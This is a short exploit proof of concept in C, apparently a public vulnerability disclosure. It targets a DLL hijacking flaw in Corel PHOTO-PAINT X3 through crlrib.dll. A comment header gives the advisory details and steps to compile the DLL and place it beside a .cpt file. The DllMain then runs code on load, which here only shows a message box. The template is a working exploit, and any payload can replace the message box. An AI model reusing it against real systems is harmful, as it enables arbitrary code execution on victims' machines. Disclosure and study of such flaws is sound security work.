/*

 Corel PHOTO-PAINT X3 v13.0.0.576 (crlrib.dll) DLL Hijacking Exploit

 Vendor: Corel Corporation
 Product Web Page: http://www.corel.com
 Affected Version: X3 v13.0.0.576

 Summary: Graphic design software for striking visual communication.

 Desc: Corel PHOTO-PAINT X3 suffers from a dll hijacking vulnerability
 that enables the attacker to execute arbitrary code on a local level. The
 vulnerable extension is .cpt thru crlrib.dll library.

 ----
 gcc -shared -o crlrib.dll corelpp.c

 Compile and rename to crlrib.dll, create a file test.cpt and
 put both files in same dir and execute.
 ----

 Tested on Microsoft Windows XP Professional SP3 (EN)



 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
 liquidworm gmail com

 Zero Science Lab - http://www.zeroscience.mk


 25.08.2010

*/


#include <windows.h>

BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{

	switch (fdwReason)
	{
		case DLL_PROCESS_ATTACH:
		dll_mll();
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

int dll_mll()
{
	MessageBox(0, "DLL Hijacked!", "DLL Message", MB_OK);
}